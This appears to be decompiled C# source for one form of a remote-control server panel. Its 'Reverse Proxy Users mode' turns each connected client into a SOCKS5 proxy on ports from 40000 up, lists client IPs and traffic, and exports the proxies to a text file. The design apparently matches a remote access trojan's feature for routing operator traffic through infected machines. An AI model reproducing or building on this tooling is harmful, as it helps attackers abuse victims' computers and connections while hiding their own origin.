using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;
using Server.Helper.Sock5;

namespace Server.Forms;

public class FormReverseProxyU : FormMaterial
{
	public bool work;

	public const int port = 40000;

	public string Ip;

	public object Stlock = new object();

	private IContainer components;

	public RJButton rjButton1;

	public DataGridView GridIps;

	private Panel panel1;

	public RJButton rjButton2;

	private Timer timer1;

	public MaterialSwitch materialSwitch2;

	public RJButton rjButton3;

	private DataGridViewTextBoxColumn Column6;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column2;

	private DataGridViewTextBoxColumn Column5;

	private DataGridViewTextBoxColumn Column3;

	private DataGridViewTextBoxColumn Column4;

	public FormReverseProxyU()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	public Server.Helper.Sock5.Server[] ServersAll()
	{
		List<Server.Helper.Sock5.Server> list = new List<Server.Helper.Sock5.Server>();
		foreach (DataGridViewRow dataGridViewRow in (IEnumerable)GridIps.Rows)
		{
			list.Add((Server.Helper.Sock5.Server)dataGridViewRow.Tag);
		}
		return list.ToArray();
	}

	public Server.Helper.Sock5.Server ServersPort(int port)
	{
		foreach (DataGridViewRow dataGridViewRow in (IEnumerable)GridIps.Rows)
		{
			if (((Server.Helper.Sock5.Server)dataGridViewRow.Tag).port == port)
			{
				return (Server.Helper.Sock5.Server)dataGridViewRow.Tag;
			}
		}
		return null;
	}

	private void RemoteDesktop_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		if (File.Exists("local\\ReverseProxyU.json"))
		{
			ReverseProxyU reverseProxyU = JsonConvert.DeserializeObject<ReverseProxyU>(File.ReadAllText("local\\ReverseProxyU.json"));
			materialSwitch2.Checked = reverseProxyU.AutoStart;
			if (reverseProxyU.AutoStart)
			{
				rjButton1.Text = "Stop";
				work = true;
			}
		}
		Ip = Methods.GetPublicIpAsync();
		timer1.Start();
	}

	private void ChangeScheme(object sender)
	{
		GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		GridIps.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		GridIps.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		GridIps.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		rjButton1.BackColor = FormMaterial.PrimaryColor;
		rjButton2.BackColor = FormMaterial.PrimaryColor;
		rjButton3.BackColor = FormMaterial.PrimaryColor;
	}

	private void Save()
	{
		File.WriteAllText("local\\ReverseProxyU.json", JsonConvert.SerializeObject(new ReverseProxyU
		{
			AutoStart = materialSwitch2.Checked
		}, Formatting.Indented));
	}

	public Server.Helper.Sock5.Server NewServer(Clients clients)
	{
		Server.Helper.Sock5.Server server = new Server.Helper.Sock5.Server(clients);
		server.StopedServer += Stoped;
		server.DisconnectClientEvent += Disconnect;
		server.DisconnectEvent += Responce;
		server.StartedServer += Started;
		server.ResponceServerEvent += Responce;
		Invoke((MethodInvoker)delegate
		{
			DataGridViewRow dataGridViewRow = new DataGridViewRow
			{
				Tag = server
			};
			server.Tag = dataGridViewRow;
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = clients.IP
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = Ip + ":" + server.port
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = "Idle"
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = server.clients.Count
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = Methods.BytesToString(server.Recives)
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = Methods.BytesToString(server.Sents)
			});
			GridIps.Rows.Add(dataGridViewRow);
		});
		if (rjButton1.Text == "Stop")
		{
			lock (Stlock)
			{
				server.Start(40000 + GridIps.Rows.Count);
			}
		}
		return server;
	}

	public void Stoped(Server.Helper.Sock5.Server server)
	{
		server.Recives = 0L;
		server.Sents = 0L;
		Invoke((MethodInvoker)delegate
		{
			DataGridViewRow obj = (DataGridViewRow)server.Tag;
			obj.Cells[1].Value = Ip + ":" + server.port;
			obj.Cells[2].Value = "Idle";
			obj.Cells[3].Value = server.clients.Count;
			obj.Cells[4].Value = Methods.BytesToString(server.Recives);
			obj.Cells[5].Value = Methods.BytesToString(server.Sents);
		});
	}

	public void Disconnect(Server.Helper.Sock5.Server server)
	{
		Invoke((MethodInvoker)delegate
		{
			GridIps.Rows.Remove((DataGridViewRow)server.Tag);
		});
	}

	public void Responce(Server.Helper.Sock5.Server server)
	{
		Invoke((MethodInvoker)delegate
		{
			DataGridViewRow obj = (DataGridViewRow)server.Tag;
			obj.Cells[3].Value = server.clients.Count;
			obj.Cells[4].Value = Methods.BytesToString(server.Recives);
			obj.Cells[5].Value = Methods.BytesToString(server.Sents);
		});
	}

	public void Responce(Client client)
	{
		Invoke((MethodInvoker)delegate
		{
			((DataGridViewRow)client.server.Tag).Cells[3].Value = client.server.clients.Count;
		});
	}

	public void Started(Server.Helper.Sock5.Server server)
	{
		Invoke((MethodInvoker)delegate
		{
			DataGridViewRow obj = (DataGridViewRow)server.Tag;
			obj.Cells[1].Value = Ip + ":" + server.port;
			obj.Cells[2].Value = "Listen";
		});
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		Save();
		if (rjButton1.Text == "Start")
		{
			int num = 40000;
			Server.Helper.Sock5.Server[] array = ServersAll();
			foreach (Server.Helper.Sock5.Server server in array)
			{
				lock (Stlock)
				{
					server.Start(num);
					num++;
				}
			}
			rjButton1.Text = "Stop";
		}
		else
		{
			Server.Helper.Sock5.Server[] array2 = ServersAll();
			for (int j = 0; j < array2.Length; j++)
			{
				array2[j].Stop();
			}
			rjButton1.Text = "Start";
		}
	}

	private void Closing1(object sender, FormClosingEventArgs e)
	{
		work = false;
		Server.Helper.Sock5.Server[] array = ServersAll();
		foreach (Server.Helper.Sock5.Server server in array)
		{
			Task.Run(delegate
			{
				server.ClientReverse[0].Disconnect();
			});
		}
		GridIps.Rows.Clear();
		timer1.Stop();
		if (rjButton1.Text == "Stop")
		{
			rjButton1.Text = "Start";
		}
		Hide();
		Save();
		e.Cancel = true;
	}

	private void rjButton2_Click(object sender, EventArgs e)
	{
		Hide();
	}

	private void timer1_Tick_1(object sender, EventArgs e)
	{
		Text = $"Reverse Proxy Users mode [{GridIps.Rows.Count}]";
	}

	private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
	{
		Save();
	}

	private void rjButton3_Click(object sender, EventArgs e)
	{
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in (IEnumerable)GridIps.Rows)
		{
			if ((string)dataGridViewRow.Cells[2].Value == "Listen")
			{
				list.Add("socks5://" + (string)dataGridViewRow.Cells[1].Value);
			}
		}
		File.WriteAllLines("Proxes.txt", list.ToArray());
		Process.Start("Proxes.txt");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager componentResourceManager = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormReverseProxyU));
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.GridIps = new System.Windows.Forms.DataGridView();
		this.panel1 = new System.Windows.Forms.Panel();
		this.rjButton3 = new CustomControls.RJControls.RJButton();
		this.materialSwitch2 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjButton2 = new CustomControls.RJControls.RJButton();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		((System.ComponentModel.ISupportInitialize)this.GridIps).BeginInit();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.rjButton1.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 0;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.ForeColor = System.Drawing.Color.White;
		this.rjButton1.Location = new System.Drawing.Point(7, 7);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(92, 27);
		this.rjButton1.TabIndex = 3;
		this.rjButton1.Text = "Start";
		this.rjButton1.TextColor = System.Drawing.Color.White;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.GridIps.AllowUserToAddRows = false;
		this.GridIps.AllowUserToDeleteRows = false;
		this.GridIps.AllowUserToResizeColumns = false;
		this.GridIps.AllowUserToResizeRows = false;
		this.GridIps.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.GridIps.BackgroundColor = System.Drawing.Color.White;
		this.GridIps.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridIps.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridIps.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridIps.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.GridIps.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridIps.Columns.AddRange(this.Column6, this.Column1, this.Column2, this.Column5, this.Column3, this.Column4);
		this.GridIps.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridIps.DefaultCellStyle = dataGridViewCellStyle2;
		this.GridIps.EnableHeadersVisualStyles = false;
		this.GridIps.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridIps.Location = new System.Drawing.Point(6, 104);
		this.GridIps.Name = "GridIps";
		this.GridIps.ReadOnly = true;
		this.GridIps.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridIps.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.GridIps.RowHeadersVisible = false;
		this.GridIps.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridIps.ShowCellErrors = false;
		this.GridIps.ShowCellToolTips = false;
		this.GridIps.ShowEditingIcon = false;
		this.GridIps.ShowRowErrors = false;
		this.GridIps.Size = new System.Drawing.Size(742, 392);
		this.GridIps.TabIndex = 14;
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.rjButton3);
		this.panel1.Controls.Add(this.rjButton1);
		this.panel1.Controls.Add(this.materialSwitch2);
		this.panel1.Controls.Add(this.rjButton2);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(749, 435);
		this.panel1.TabIndex = 15;
		this.rjButton3.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BorderRadius = 0;
		this.rjButton3.BorderSize = 0;
		this.rjButton3.FlatAppearance.BorderSize = 0;
		this.rjButton3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton3.ForeColor = System.Drawing.Color.White;
		this.rjButton3.Location = new System.Drawing.Point(105, 7);
		this.rjButton3.Name = "rjButton3";
		this.rjButton3.Size = new System.Drawing.Size(92, 27);
		this.rjButton3.TabIndex = 17;
		this.rjButton3.Text = "Import";
		this.rjButton3.TextColor = System.Drawing.Color.White;
		this.rjButton3.UseVisualStyleBackColor = false;
		this.rjButton3.Click += new System.EventHandler(rjButton3_Click);
		this.materialSwitch2.AutoSize = true;
		this.materialSwitch2.Depth = 0;
		this.materialSwitch2.Location = new System.Drawing.Point(298, 3);
		this.materialSwitch2.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch2.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch2.Name = "materialSwitch2";
		this.materialSwitch2.Ripple = true;
		this.materialSwitch2.Size = new System.Drawing.Size(129, 37);
		this.materialSwitch2.TabIndex = 16;
		this.materialSwitch2.Text = "Auto Start";
		this.materialSwitch2.UseVisualStyleBackColor = true;
		this.materialSwitch2.CheckedChanged += new System.EventHandler(materialSwitch2_CheckedChanged);
		this.rjButton2.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BorderRadius = 0;
		this.rjButton2.BorderSize = 0;
		this.rjButton2.FlatAppearance.BorderSize = 0;
		this.rjButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton2.ForeColor = System.Drawing.Color.White;
		this.rjButton2.Location = new System.Drawing.Point(203, 7);
		this.rjButton2.Name = "rjButton2";
		this.rjButton2.Size = new System.Drawing.Size(92, 27);
		this.rjButton2.TabIndex = 16;
		this.rjButton2.Text = "Hide";
		this.rjButton2.TextColor = System.Drawing.Color.White;
		this.rjButton2.UseVisualStyleBackColor = false;
		this.rjButton2.Click += new System.EventHandler(rjButton2_Click);
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick_1);
		this.Column6.HeaderText = "Client";
		this.Column6.MinimumWidth = 120;
		this.Column6.Name = "Column6";
		this.Column6.ReadOnly = true;
		this.Column6.Width = 120;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.Column1.HeaderText = "Proxy";
		this.Column1.MinimumWidth = 120;
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column1.Width = 150;
		this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column2.HeaderText = "Status";
		this.Column2.MinimumWidth = 100;
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column5.HeaderText = "Connects";
		this.Column5.MinimumWidth = 100;
		this.Column5.Name = "Column5";
		this.Column5.ReadOnly = true;
		this.Column3.HeaderText = "Recives";
		this.Column3.MinimumWidth = 100;
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column4.HeaderText = "Sents";
		this.Column4.MinimumWidth = 100;
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(755, 502);
		base.Controls.Add(this.GridIps);
		base.Controls.Add(this.panel1);
		base.Icon = (System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
		this.MinimumSize = new System.Drawing.Size(560, 443);
		base.Name = "FormReverseProxyU";
		this.Text = "Reverse Proxy Users mode [0]";
		base.Load += new System.EventHandler(RemoteDesktop_Load);
		((System.ComponentModel.ISupportInitialize)this.GridIps).EndInit();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
	}
}
